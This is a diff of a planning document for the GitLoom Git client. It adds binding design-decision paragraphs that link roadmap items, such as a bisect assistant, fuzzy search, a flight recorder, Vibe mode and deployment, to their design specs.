+Binding now: every proto stays transport-agnostic (G-14); a WAN-latency CI job (`tc netem` 80 ms) runs the P2-14 end-to-end suite once per release; grid protocol + merge-queue RPCs must pass it unchanged. Implementation when scheduled: daemon container image (same binary), mTLS + user auth replacing the session token, per-tenant encryption at rest, `RemoteEnvironment` picker (local VM | cloud), repo sync via `git push gitloom-cloud` over HTTPS (`gitloom-cloud` is the cloud substrate's resolved `SyncRemote.Name` — same quarantine-sync-remote role as WSL2's `gitloom-vm`, per ESC B1 decision SC-2 / P2-06).
 
 **Acceptance:** the unchanged P2-14 suite passing over WAN; terminal echo < 100 ms at 80 ms RTT.
 
@@ -1010,7 +1045,7 @@ Contract summary (strategy §K-1, binding): daemon service tapping agent-CLI + d
 
 **Milestone:** any · **Priority:** P1 competitive parity (GitKraken/Fork power features; C3 doubles as the swarm control surface).
 
-These three follow `docs/GitLoom_Backlog.md` §A sketches with v1 conventions (typed errors, async commands, interface-first, tests-with-PR, journal integration where HEAD moves):
+These three follow `docs/planning/GitLoom_Backlog.md` §A sketches with v1 conventions (typed errors, async commands, interface-first, tests-with-PR, journal integration where HEAD moves):
 
 - **P2-C1 Interactive bisect assistant:** `StartBisect/MarkGood/MarkBad/MarkSkip/ResetBisect` (CLI via `RunGitChecked`, pure `BISECT_LOG` parser, `BisectState` with steps-left), wizard UI with Good/Bad/Skip + progress + culprit card (T-32 context), journaled HEAD moves, dirty-tree refusal. Offline-verifiable end-to-end.
 - **P2-C2 Global fuzzy search:** `ISearchAggregator` fanning to commits/branches/tags/files + host PRs/issues (T-23/T-24) with the T-18 `FuzzyMatcher`, merged ranking, debounce; `Ctrl+Shift+F` overlay with grouped, highlighted results; Enter jumps.
@@ -1022,6 +1057,8 @@ These three follow `docs/GitLoom_Backlog.md` §A sketches with v1 conventions (t
 
 
 ---
+
+**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §1–§3.** Bisect assistant (Good/Bad/Skip wizard + progress + culprit card), global fuzzy search (grouped, highlighted, keyboard-first overlay), multi-repo home + the cross-repo attention lane — each designed end-to-end (flow, surface, keyboard-first interactions, delight moment, all five themes). Keyboard additions: FeatureDesigns Appendix B. The command-surface system that extends T-18 (coverage contract, naming grammar, gesture tiers, disclosure ladder): [`ProductAndUX.md`](../../design/ProductAndUX.md) Part 3. Net-new unscheduled candidates beyond C1–C5: ProductAndUX Part 1 (I-1…I-10).
 
 # 5. COMPETITIVE-MATCH WAVE (M7.75 — match every competitor feature, then beat it)
 
@@ -1115,6 +1152,8 @@ gate before the (sequential, per-repo, human) merges.
 **Required tests:** board projection from fixture states (no illegal transitions offered); comparison VM with 3 fixture branches; winner-pick → rejection path.
 
 ---
+
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §7.** The session board as kanban plus side-by-side candidate comparison.
 
 ## P2-30 — Automations & scheduling (matches Superset automations, Codex Automations, Jules scheduled tasks)
 
@@ -1400,6 +1439,8 @@ Four small, high-daily-value items in one task:
 
 ---
 
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §4.** The orchestration UX pack is designed into the workspace dock (per-agent terminal + diff + staging, P2-13 dock + this pack + the P2-44 strip as one workspace).
+
 ## P2-40 — Composer & review conveniences: image input, voice dictation, edit-in-place, external-editor links, rendered previews (matches Codex/Kepler/Jules input breadth; Superset editor pattern)
 
 **Milestone:** M7.75 · **Priority:** P2-parity · **Depends on:** P2-03 (composer), T-13 (viewers).
@@ -1430,6 +1471,8 @@ wrapper of the same API; cross-device *continuity* arrives with P3-06.
 **Required tests:** pairing/revocation; role enforcement at the API layer; remote approval lands with correct identity; observe role cannot mutate.
 
 ---
+
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §8.** The remote dashboard is designed with the telemetry family (health / recorder / remote) as §8's panel set; state vocabulary per §9.
 
 ## P2-42 — Merge-train simulation, verification cache & test-impact ordering (novel — extends P2-10)
 
@@ -1478,6 +1521,8 @@ pastebin at 14:02"). Verifiable trust as a visible daily feature, not a whitepap
 
 ---
 
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §4 (health strip) + §8.** Sandbox health reads as part of the workspace strip and the §8 telemetry panels.
+
 ## P2-45 — Agent flight recorder (novel — PTY recording indexed to commits/hunks)
 
 **Milestone:** M8 · **Priority:** P2 differentiator · **Depends on:** P2-03/P2-18 (terminal ownership), P2-39 (parsed events), P2-15.
@@ -1492,6 +1537,8 @@ offline; recordings referenced from audit entries (retention/redaction rules sha
 
 ---
 
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §8.** The flight-recorder surface belongs to the §8 telemetry panel family; badges and states per §9.
+
 ## P2-C4 — Working-copy power tools: split-into-branches wizard & stacked-branch restacking (matches GitButler's jobs-to-be-done at 10% of the cost)
 
 **Milestone:** client-parity track · **Priority:** P1 · **Depends on:** T-06 patch model, T-08 rebase, T-19 journal (all shipped).
@@ -1503,6 +1550,8 @@ offline; recordings referenced from audit entries (retention/redaction rules sha
 **Required tests:** split property test (partition completeness); group-commit round-trip; restack on amend/merge fixtures incl. conflict path.
 
 ---
+
+**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §4.** The split-into-branches untangling wizard as a designed experience.
 
 ## P2-C5 — Client polish pack: standalone mergetool, external difftool, partial stash UI, patch files & WIP sharing, commit templates/gitmoji, diff search, AI commit message (Tower/Fork/Sublime/GitKraken parity checkboxes)
 
@@ -1519,6 +1568,8 @@ offline; recordings referenced from audit entries (retention/redaction rules sha
 **Required tests:** per item — mergetool arg plumbing + resolver round-trip; stash-paths; patch round-trip incl. ref-share import; composer template/gitmoji snapshot; AI-message convention enforcement with a fixture provider.
 
 ---
+
+**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §5.** The polish pack designed as experiences; the T-22 analytics redesign mandates (M-D1/M-D2 secondary encodings + gates G-D1…G-D4, with the computed CVD validator record): [`ProductAndUX.md`](../../design/ProductAndUX.md) Part 4 and `docs/design/assets/AnalyticsRedesign.html`.
 
 # 6. WAVE 3 — THE VIBE PRODUCT (K-2…K-5, fully specified)
 
@@ -1594,6 +1645,8 @@ Wording is non-technical (tested against a copy deck, not developer jargon); the
 
 ---
 
+**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §3.** Plain-language triage with **exactly three actions** — "Try a different approach" / "Go back to when it worked" / "Get help" — no raw stack traces, a "show technical details" expander, honest disabled states.
+
 ## P3-03 — Vibe UI: mode toggle, chat, live preview (K-4)
 
 **Milestone:** M9 · **Priority:** P0 · **Depends on:** P3-01, P3-02, P2-13.
@@ -1606,6 +1659,8 @@ Contract summary (strategy §K-4, binding): in-app mode switch (never an install
 
 ---
 
+**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §1/§2/§5 + [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §0.3.** **Vibe is a separate app** — the in-shell Build/Pro toggle is dropped; VibeModeDesign specifies the standalone product's 2-pane Chat + LivePreview, with orchestrator events rendered as friendly cards translating the OPS §3.4 event types. Its views stay implemented and harness-rendered on `phase2`, reachable from no menu.
+
 ## P3-04 — One-click deployment (K-5)
 
 **Milestone:** M9 · **Priority:** P1 · **Depends on:** P3-03, P2-22 (loopback OAuth).
@@ -1617,6 +1672,8 @@ Contract summary (strategy §K-5, binding): Vercel + Netlify providers behind an
 **Required tests:** provider clients against recorded fixtures (create/trigger/poll/fail); end-to-end against a real test account (network-gated trait); token-storage audit test.
 
 ---
+
+**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §4.** The "Publish to Web" flow and the live-URL card.
 
 ## P3-05 — GitLoom Web: the hosted Vibe delivery (new — completes the K-stream decision)
 
